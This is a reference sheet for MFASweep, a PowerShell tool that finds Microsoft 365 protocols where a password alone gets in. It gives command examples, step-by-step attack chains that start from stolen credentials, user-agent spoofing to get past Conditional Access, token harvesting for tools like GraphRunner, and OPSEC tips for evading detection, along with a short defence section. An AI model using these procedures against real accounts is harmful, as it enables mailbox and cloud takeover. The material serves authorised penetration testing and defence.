# MFASweep

**Type:** PowerShell Script
**Purpose:** Identify single-factor authentication gaps in Microsoft 365 services despite MFA being enabled
**Platform:** Windows, PowerShell Core
**Tags:** #mfa #conditional-access #m365 #authentication #bypass #initial-access #powershell #ews #activesync

---

## Installation & Setup

```powershell
# Clone repository
git clone https://github.com/dafthack/MFASweep.git
cd MFASweep

# Import module
Import-Module .\MFASweep.ps1

# Or dot-source
. .\MFASweep.ps1
```

---

## Quick Reference (Most Common Commands)

```powershell
# Full MFA sweep (all protocols)
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!'

# With ADFS check
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -IncludeADFS

# Save tokens to file
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -WriteTokens

# Brute force client IDs
Invoke-BruteClientIDs -Username user@company.com -Password 'P@ssw0rd!' -VerboseOut
```

---

## CRED: MFA Gap Discovery

### CRED: Full MFA Sweep
**Use Case:** Test all Microsoft services for MFA gaps

```powershell
# Test all protocols
Invoke-MFASweep -Username user@company.com -Password 'Winter2024!'

# Tests 10 different authentication methods:
# 1. Microsoft Graph API
# 2. Azure Service Management API
# 3. Exchange Web Services (EWS)
# 4. M365 Web Portal (Windows)
# 5. M365 Web Portal (Linux)
# 6. M365 Web Portal (MacOS)
# 7. M365 Web Portal (Android)
# 8. M365 Web Portal (iPhone)
# 9. M365 Web Portal (Windows Phone)
# 10. ActiveSync

# WARNING: 10 login attempts - may cause lockout if password is wrong!
```

### CRED: MFA Sweep with ADFS
**Use Case:** Include on-premises ADFS testing

```powershell
# Include ADFS check (11th attempt)
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -IncludeADFS

# Also performs reconnaissance on ADFS configuration
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -Recon -IncludeADFS
```

### CRED: Save Access Tokens
**Use Case:** Capture successful authentication tokens

```powershell
# Write tokens to AccessTokens.json
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -WriteTokens

# Saves tokens for:
# - Graph API
# - Azure Management API
# - O365 Web Portal (various devices)

# NOTE: Does not save tokens for EWS, ActiveSync, ADFS
```

---

## CRED: Individual Protocol Testing

### CRED: Microsoft Graph API
**Use Case:** Test Graph API for MFA

```powershell
# Graph API authentication
Invoke-GraphAPIAuth -Username user@company.com -Password 'P@ssw0rd!'

# If successful without MFA:
# - Can use Graph API tokens
# - Access to user data, mail, files, etc.
```

### CRED: Azure Service Management API
**Use Case:** Test Azure Management for MFA

```powershell
# Azure Management API
Invoke-AzureManagementAPIAuth -Username user@company.com -Password 'P@ssw0rd!'

# If successful without MFA:
# - Can manage Azure resources
# - List VMs, storage, etc.
```

### CRED: Exchange Web Services (EWS)
**Use Case:** Test EWS for MFA

```powershell
# EWS authentication
Invoke-EWSAuth -Username user@company.com -Password 'P@ssw0rd!'

# If successful without MFA:
# - Can access mailbox via EWS
# - Read/send emails
# - Often bypasses MFA
```

### CRED: O365 Web Portal
**Use Case:** Test web portal with different device types

```powershell
# Desktop browser (default)
Invoke-O365WebPortalAuth -Username user@company.com -Password 'P@ssw0rd!'

# Mobile user agents (6 types)
Invoke-O365WebPortalAuthMobile -Username user@company.com -Password 'P@ssw0rd!'

# Tests with user agents:
# - Windows desktop
# - Linux desktop
# - MacOS desktop
# - Android phone
# - iPhone
# - Windows Phone

# Different user agents may bypass MFA based on CA policies
```

### CRED: ActiveSync
**Use Case:** Test ActiveSync protocol

```powershell
# ActiveSync authentication
Invoke-O365ActiveSyncAuth -Username user@company.com -Password 'P@ssw0rd!'

# If successful without MFA:
# - Can sync email via ActiveSync
# - Mobile device protocol
# - Commonly left single-factor
```

### CRED: ADFS
**Use Case:** Test on-premises ADFS

```powershell
# ADFS authentication
Invoke-ADFSAuth -Username user@company.com -Password 'P@ssw0rd!'

# Tests on-prem ADFS server
# May have different MFA config than cloud
```

---

## CRED: Advanced Client ID Brute Force

### CRED: Brute Force Client IDs
**Use Case:** Find single-factor access via different client ID combinations

```powershell
# Brute force various client IDs and resources
Invoke-BruteClientIDs -Username user@company.com -Password 'P@ssw0rd!' -VerboseOut

# Tests many combinations of:
# - Client IDs (different MS applications)
# - Resource types
# - ROPC (Resource Owner Password Credential) flow

# Finds overlooked single-factor access points
# Writes successful tokens to AccessTokens.json
```

---

## Attack Patterns

### Pattern: Password Spray → MFA Sweep → Exploit Gaps
```powershell
# 1. First, obtain valid credentials
# (via o365spray, breach data, phishing, etc.)

# 2. Run MFA sweep to find single-factor protocols
Invoke-MFASweep -Username compromised@company.com -Password 'Summer2024!' -WriteTokens

# 3. Review results
# Look for SUCCESS without MFA prompt

# 4. Exploit single-factor protocol
# If EWS is single-factor:
Invoke-EWSAuth -Username compromised@company.com -Password 'Summer2024!'
# Access mailbox without MFA

# If ActiveSync is single-factor:
Invoke-O365ActiveSyncAuth -Username compromised@company.com -Password 'Summer2024!'
# Sync mail to mobile client without MFA
```

### Pattern: Conditional Access Bypass via User Agent
```powershell
# 1. Run MFA sweep
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!'

# 2. Check which device types allow single-factor
# Example results:
# - Windows desktop: MFA Required
# - iPhone: SUCCESS (no MFA!)
# - Android: MFA Required

# 3. Use successful user agent for access
# Spoof iPhone user agent in subsequent requests
# Bypass CA policy that requires MFA for desktops only
```

### Pattern: Client ID Discovery for Token Theft
```powershell
# 1. Brute force client IDs
Invoke-BruteClientIDs -Username user@company.com -Password 'P@ssw0rd!' -VerboseOut

# 2. Identify client ID + resource combinations that work single-factor

# 3. Use discovered client IDs for:
# - Token requests
# - OAuth flows
# - Resource access without MFA
```

### Pattern: Federated vs Cloud MFA Bypass
```powershell
# 1. Check if tenant is federated
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -Recon

# 2. If federated, test ADFS
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -IncludeADFS

# 3. Often ADFS has different MFA config than cloud
# May find single-factor on-prem access even if cloud requires MFA
```

---

## Common MFA Gaps

### Frequently Single-Factor Protocols

**Exchange Web Services (EWS):**
- Legacy protocol
- Often excluded from CA policies
- Allows mailbox access
- Can read/send emails

**ActiveSync:**
- Mobile device protocol
- Commonly left single-factor for "user convenience"
- Full mailbox sync capability
- May sync contacts, calendar too

**Legacy Authentication:**
- POP3, IMAP, SMTP
- Often not covered by modern CA policies
- Basic authentication

**Different Device Types:**
- Mobile devices (iOS/Android) may be excluded
- "Trusted" OS types bypass MFA
- Misconfigured CA policies

**ADFS:**
- On-prem may have weaker MFA
- Different policies than cloud
- Federation trust can be abused

---

## Understanding Results

### Success without MFA
```
[+] SUCCESS: Protocol Name
    No MFA challenge presented
    Single-factor access confirmed
```
**Action:** Exploit this protocol for access

### MFA Required
```
[-] FAILURE: Protocol Name
    MFA required
    Cannot proceed with password only
```
**Action:** This protocol is properly protected

### Authentication Failed
```
[-] FAILURE: Protocol Name
    Authentication failed
    Invalid credentials or account locked
```
**Action:** Verify credentials, check for lockout

---

## Access Token Usage

### Using Saved Tokens

```powershell
# Tokens saved to AccessTokens.json

# Load tokens
$tokens = Get-Content AccessTokens.json | ConvertFrom-Json

# Use Graph API token
$graphToken = $tokens.GraphAPIToken

# Use with other tools
# AADInternals:
Import-Module AADInternals
# Use token with AADInternals commands

# PowerShell:
$headers = @{Authorization = "Bearer $graphToken"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
```

---

## Pro Tips

💡 **Lockout Warning**: 10-11 login attempts - ensure correct password to avoid lockout
💡 **EWS is Common**: EWS frequently left single-factor - high value target
💡 **ActiveSync Gold**: Mobile sync protocol often overlooked in CA policies
💡 **Device Type Matters**: iOS/Android may bypass MFA that desktop requires
💡 **Client ID Brute**: Use Invoke-BruteClientIDs to find obscure access paths
💡 **Save Tokens**: Always use -WriteTokens to preserve successful access
💡 **ADFS Different**: On-prem ADFS may have weaker MFA than cloud
💡 **CA Policy Gaps**: Most MFA bypasses due to misconfigured Conditional Access
💡 **Legacy Protocols**: Older protocols (EWS, ActiveSync) commonly excluded
💡 **Recon First**: Use -Recon to understand tenant configuration before attacking

---

## Conditional Access Policy Analysis

### Common CA Policy Mistakes

**Excluding Legacy Protocols:**
- EWS, ActiveSync, POP3, IMAP not covered
- "Modern authentication only" policies

**Device Platform Exclusions:**
- Mobile devices (iOS/Android) excluded for "usability"
- Specific OS types trusted implicitly

**Application Exclusions:**
- Certain apps excluded from MFA
- "Trusted" applications list too broad

**Location-Based:**
- Internal/trusted networks bypass MFA
- VPN connections exempt

**User/Group Exceptions:**
- Service accounts excluded
- IT administrators exempt (risky!)

---

## OPSEC Considerations

⚠️ **High Risk:**
- 10+ authentication attempts (lockout danger)
- All attempts logged in Azure AD sign-in logs
- Failed attempts generate alerts
- May trigger account lockout

⚠️ **Medium Risk:**
- Successful single-factor access logged
- Authentication from new location/IP
- Unusual user agent strings

✅ **Lower Risk:**
- Using valid credentials (no failed auth)
- Matching normal user behavior patterns
- Spacing out attempts over time

**Detection Vectors:**
- Azure AD sign-in logs (all 10-11 attempts visible)
- Multiple authentication method attempts
- Failed authentication alerts
- Account lockout events
- Unusual protocol usage (EWS, ActiveSync from new location)
- CA policy compliance logs

---

## Recommendations for Defense

### For Blue Team

**Close MFA Gaps:**
1. Enable MFA for all protocols (including legacy)
2. Use Conditional Access to require MFA for all apps
3. Block legacy authentication entirely
4. Apply consistent policies across all device types
5. Enforce MFA on ADFS (on-prem)

**Detection:**
1. Monitor for legacy protocol usage (EWS, ActiveSync)
2. Alert on authentication from unusual locations
3. Track accounts with single-factor access
4. Review CA policy exclusions regularly
5. Monitor for rapid authentication attempts (like MFASweep)

**Audit:**
```powershell
# Review CA policies
Get-AzureADMSConditionalAccessPolicy

# Check for legacy auth
# Review sign-in logs for:
# - EWS
# - ActiveSync
# - SMTP Auth
# - POP3/IMAP
```

---

## Integration with Other Tools

### Use with AADInternals
```powershell
# 1. Find MFA gap with MFASweep
Invoke-MFASweep -Username user@company.com -Password 'P@ssw0rd!' -WriteTokens

# 2. Load tokens
$tokens = Get-Content AccessTokens.json | ConvertFrom-Json

# 3. Use with AADInternals
Import-Module AADInternals
# Use saved tokens for AADInternals operations
```

### Use with GraphRunner
```powershell
# 1. Get single-factor Graph API access
Invoke-GraphAPIAuth -Username user@company.com -Password 'P@ssw0rd!'

# 2. Use token with GraphRunner
Import-Module GraphRunner
# Use token for pillaging operations
```

---

## Resources

- GitHub: https://github.com/dafthack/MFASweep
- Blog: https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/
- Author: @dafthack (Beau Bullock)
- Company: Black Hills Information Security
